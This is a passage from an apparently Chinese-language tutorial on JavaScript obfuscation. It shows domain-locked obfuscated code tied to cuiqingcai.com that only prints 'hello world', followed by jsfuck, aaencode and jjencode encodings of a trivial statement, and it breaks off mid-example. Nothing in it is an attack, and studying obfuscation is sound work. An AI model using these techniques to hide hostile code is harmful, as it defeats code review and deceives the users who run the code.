class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x3203 = [</span><br><span class="line">  <span class="string">"apply"</span>,</span><br><span class="line">  <span class="string">"return\x20(function()\x20"</span>,</span><br><span class="line">  <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span>,</span><br><span class="line">  <span class="string">"item"</span>,</span><br><span class="line">  <span class="string">"attribute"</span>,</span><br><span class="line">  <span class="string">"value"</span>,</span><br><span class="line">  <span class="string">"replace"</span>,</span><br><span class="line">  <span class="string">"length"</span>,</span><br><span class="line">  <span class="string">"charCodeAt"</span>,</span><br><span class="line">  <span class="string">"log"</span>,</span><br><span class="line">  <span class="string">"hello\x20world"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x2ed22c, _0x3ad370</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x49dc54 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x53a786</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x53a786) &#123;</span><br><span class="line">      _0x2ed22c[<span class="string">"push"</span>](_0x2ed22c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x49dc54(++_0x3ad370);</span><br><span class="line">&#125;)(_0x3203, <span class="number">0x155</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5b38 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xd7780b, _0x19c0f2</span>) </span>&#123;</span><br><span class="line">  _0xd7780b = _0xd7780b - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x2d2f44 = _0x3203[_0xd7780b];</span><br><span class="line">  <span class="keyword">return</span> _0x2d2f44;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x485919 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x5cf798 = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0xd1fa29, _0x2ed646</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x56abf = _0x5cf798</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x2ed646) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x33af63 = _0x2ed646[_0x5b38(<span class="string">"0x0"</span>)](_0xd1fa29, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x2ed646 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x33af63;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x5cf798 = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x56abf;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x67dcc8 = _0x485919(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x276a31;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5c8be2 = <span class="built_in">Function</span>(_0x5b38(<span class="string">"0x1"</span>) + _0x5b38(<span class="string">"0x2"</span>) + <span class="string">");"</span>);</span><br><span class="line">    _0x276a31 = _0x5c8be2();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x5f1c00) &#123;</span><br><span class="line">    _0x276a31 = <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x254a0d = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      key: _0x5b38(<span class="string">"0x3"</span>),</span><br><span class="line">      value: _0x5b38(<span class="string">"0x4"</span>),</span><br><span class="line">      getAttribute: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _0x5cc3c7 = <span class="number">0x0</span>; _0x5cc3c7 &lt; <span class="number">0x3e8</span>; _0x5cc3c7--) &#123;</span><br><span class="line">          <span class="keyword">var</span> _0x35b30b = _0x5cc3c7 &gt; <span class="number">0x0</span>;</span><br><span class="line">          <span class="keyword">switch</span> (_0x35b30b) &#123;</span><br><span class="line">            <span class="keyword">case</span> !![]:</span><br><span class="line">              <span class="keyword">return</span> (</span><br><span class="line">                <span class="keyword">this</span>[_0x5b38(<span class="string">"0x3"</span>)] +</span><br><span class="line">                <span class="string">"_"</span> +</span><br><span class="line">                <span class="keyword">this</span>[_0x5b38(<span class="string">"0x5"</span>)] +</span><br><span class="line">                <span class="string">"_"</span> +</span><br><span class="line">                _0x5cc3c7</span><br><span class="line">              );</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">this</span>[_0x5b38(<span class="string">"0x3"</span>)] + <span class="string">"_"</span> + <span class="keyword">this</span>[_0x5b38(<span class="string">"0x5"</span>)];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)(),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x3b375a = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"[QLCIKYkCFzdWpzRAXMhxJOYpTpYWJHPll]"</span>, <span class="string">"g"</span>);</span><br><span class="line">  <span class="keyword">var</span> _0x5a94d2 = <span class="string">"cuQLiqiCInKYkgCFzdWcpzRAaXMi.hcoxmJOYpTpYWJHPll"</span></span><br><span class="line">    [_0x5b38(<span class="string">"0x6"</span>)](_0x3b375a, <span class="string">""</span>)</span><br><span class="line">    [<span class="string">"split"</span>](<span class="string">";"</span>);</span><br><span class="line">  <span class="keyword">var</span> _0x5c0da2;</span><br><span class="line">  <span class="keyword">var</span> _0x19ad5d;</span><br><span class="line">  <span class="keyword">var</span> _0x5992ca;</span><br><span class="line">  <span class="keyword">var</span> _0x40bd39;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x5cad1 <span class="keyword">in</span> _0x276a31) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x74</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x5</span>) == <span class="number">0x65</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x3</span>) == <span class="number">0x75</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x64</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x5c0da2 = _0x5cad1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x29551 <span class="keyword">in</span> _0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x6</span> &amp;&amp;</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x5</span>) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x64</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x19ad5d = _0x29551;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">"~"</span> &gt; _0x19ad5d)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x2b71bd <span class="keyword">in</span> _0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x6c</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x5992ca = _0x2b71bd;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x397f55 <span class="keyword">in</span> _0x276a31[_0x5c0da2][_0x5992ca]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x397f55[<span class="string">"length"</span>] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">        _0x397f55[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x65</span> &amp;&amp;</span><br><span class="line">        _0x397f55[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x68</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x40bd39 = _0x397f55;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x5c0da2 || !_0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x5f19be = _0x276a31[_0x5c0da2][_0x19ad5d];</span><br><span class="line">  <span class="keyword">var</span> _0x674f76 =</span><br><span class="line">    !!_0x276a31[_0x5c0da2][_0x5992ca] &amp;&amp;</span><br><span class="line">    _0x276a31[_0x5c0da2][_0x5992ca][_0x40bd39];</span><br><span class="line">  <span class="keyword">var</span> _0x5e1b34 = _0x5f19be || _0x674f76;</span><br><span class="line">  <span class="keyword">if</span> (!_0x5e1b34) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x593394 = ![];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x479239 = <span class="number">0x0</span>; _0x479239 &lt; _0x5a94d2[<span class="string">"length"</span>]; _0x479239++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x19ad5d = _0x5a94d2[_0x479239];</span><br><span class="line">    <span class="keyword">var</span> _0x112c24 = _0x5e1b34[<span class="string">"length"</span>] - _0x19ad5d[<span class="string">"length"</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x51731c = _0x5e1b34[<span class="string">"indexOf"</span>](_0x19ad5d, _0x112c24);</span><br><span class="line">    <span class="keyword">var</span> _0x173191 = _0x51731c !== <span class="number">-0x1</span> &amp;&amp; _0x51731c === _0x112c24;</span><br><span class="line">    <span class="keyword">if</span> (_0x173191) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x5e1b34[<span class="string">"length"</span>] == _0x19ad5d[_0x5b38(<span class="string">"0x7"</span>)] ||</span><br><span class="line">        _0x19ad5d[<span class="string">"indexOf"</span>](<span class="string">"."</span>) === <span class="number">0x0</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x593394 = !![];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x593394) &#123;</span><br><span class="line">    data;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x254a0d();</span><br><span class="line">&#125;);</span><br><span class="line">_0x67dcc8();</span><br><span class="line"><span class="built_in">console</span>[_0x5b38(<span class="string">"0x9"</span>)](_0x5b38(<span class="string">"0xa"</span>));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这段代码就只能在指定域名 cuiqingcai.com 下运行，不能在其他网站运行。这样的话，如果一些相关 JavaScript 代码被单独剥离出来，想在其他网站运行或者使用程序模拟运行的话，运行结果只有是失败，这样就可以有效降低被代码被模拟或盗用的风险。</p>
                  <h3 id="特殊编码"><a href="#特殊编码" class="headerlink" title="特殊编码"></a>特殊编码</h3>
                  <p>另外还有一些特殊的工具包，如使用 aaencode、jjencode、jsfuck 等工具对代码进行混淆和编码。</p>
                  <p>示例如下：</p>
                  <figure class="highlight stylus">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">1</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>jsfuck 的结果：</p>
                  <figure class="highlight markdown">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]][<span class="string">([</span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]]([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]][<span class="string">([</span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([][[]]+[])[+!![]]+</span><br><span class="line">...</span><br><span class="line">([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]]((!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(+&#123;&#125;+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]])(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]))[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]])(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>])(([<span class="string"></span>]+&#123;&#125;)[<span class="string">+[</span>]])[<span class="string">+[</span>]]+(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+[<span class="string"></span>])+([][[]]+[])[!+[]+!![]])+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(+!![]+[]))(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>aaencode 的结果：</p>
                  <figure class="highlight gcode">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   / [<span class="string">'_'</span>]; o=<span class="comment">(ﾟｰﾟ)</span>  =_=<span class="number">3</span>; c=<span class="comment">(ﾟΘﾟ)</span> =<span class="comment">(ﾟｰﾟ)</span>-<span class="comment">(ﾟｰﾟ)</span>; <span class="comment">(ﾟДﾟ)</span> =<span class="comment">(ﾟΘﾟ)</span>= <span class="comment">(o^_^o)</span>/ <span class="comment">(o^_^o)</span>;<span class="comment">(ﾟДﾟ)</span>=&#123;ﾟΘﾟ: <span class="string">'_'</span> ,ﾟωﾟﾉ : <span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :<span class="comment">(ﾟωﾟﾉ+ '_')</span>[o^_^o -<span class="comment">(ﾟΘﾟ)</span>] ,ﾟДﾟﾉ:<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>)[ﾟｰﾟ] &#125;; <span class="comment">(ﾟДﾟ)</span> [ﾟΘﾟ] =<span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [c^_^o];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>] = <span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [ <span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>-<span class="comment">(ﾟΘﾟ)</span> ];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>] = <span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [ﾟΘﾟ];<span class="comment">(ﾟoﾟ)</span>=<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>]+<span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>]+<span class="comment">(ﾟωﾟﾉ +'_')</span>[ﾟΘﾟ]+ <span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [ﾟｰﾟ] + <span class="comment">((ﾟДﾟ)</span> +<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>]+ <span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span> - <span class="comment">(ﾟΘﾟ)</span>]+<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>]+<span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>]+ <span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'_'</span>] =<span class="comment">(o^_^o)</span> [ﾟoﾟ] [ﾟoﾟ];<span class="comment">(ﾟεﾟ)</span>=<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+ <span class="comment">(ﾟДﾟ)</span> .ﾟДﾟﾉ+<span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span> + <span class="comment">(ﾟｰﾟ)</span>]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [o^_^o -ﾟΘﾟ]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+ <span class="comment">(ﾟωﾟﾉ +'_')</span> [ﾟΘﾟ]; <span class="comment">(ﾟｰﾟ)</span>+=<span class="comment">(ﾟΘﾟ)</span>; <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]=<span class="string">'\\'</span>; <span class="comment">(ﾟДﾟ)</span>.ﾟΘﾟﾉ=<span class="comment">(ﾟДﾟ+ ﾟｰﾟ)</span>[o^_^o -<span class="comment">(ﾟΘﾟ)</span>];<span class="comment">(oﾟｰﾟo)</span>=<span class="comment">(ﾟωﾟﾉ +'_')</span>[c^_^o];<span class="comment">(ﾟДﾟ)</span> [ﾟoﾟ]=<span class="string">'\"'</span>;<span class="comment">(ﾟДﾟ)</span> [<span class="string">'_'</span>] <span class="comment">( (ﾟДﾟ)</span> [<span class="string">'_'</span>] <span class="comment">(ﾟεﾟ+(ﾟДﾟ)</span>[ﾟoﾟ]+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">((o^_^o)</span> - <span class="comment">(ﾟΘﾟ)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((ﾟｰﾟ)</span> + <span class="comment">(o^_^o)</span>)+ <span class="comment">((ﾟｰﾟ)</span> + <span class="comment">(ﾟΘﾟ)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟoﾟ])<span class="comment">(ﾟΘﾟ)</span>)<span class="comment">((ﾟΘﾟ)</span>+<span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((ﾟｰﾟ)</span>+<span class="comment">(ﾟΘﾟ)</span>)+<span class="comment">(ﾟΘﾟ)</span>+<span class="comment">(ﾟДﾟ)</span>[ﾟoﾟ]);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>jjencode 的结果：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$</span>=~[];<span class="variable">$</span>=&#123;___:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>:(![]+<span class="string">""</span>)[<span class="variable">$</span>],__<span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$_:</span>(![]+<span class="string">""</span>)[<span class="variable">$</span>],_<span class="variable">$_:</span>++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$</span><span class="variable">$</span>:(&#123;&#125;+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$</span><span class="variable">$_</span><span class="variable">$</span>:(<span class="variable">$</span>[<span class="variable">$</span>]+<span class="string">""</span>)[<span class="variable">$</span>],_<span class="variable">$</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$_:</span>(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$__:</span>++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$__:</span>(&#123;&#125;+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$</span><span class="variable">$_:</span>++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$___:</span>++<span class="variable">$</span>,<span class="variable">$__</span><span class="variable">$</span>:++<span class="variable">$</span>&#125;;<span class="variable">$</span>.<span class="variable">$_</span>=(<span class="variable">$</span>.<span class="variable">$_</span>=<span class="variable">$</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span><span class="variable">$</span>]+(<span class="variable">$</span>._<span class="variable">$</span>=<span class="variable">$</span>.<span class="variable">$_</span>[<span 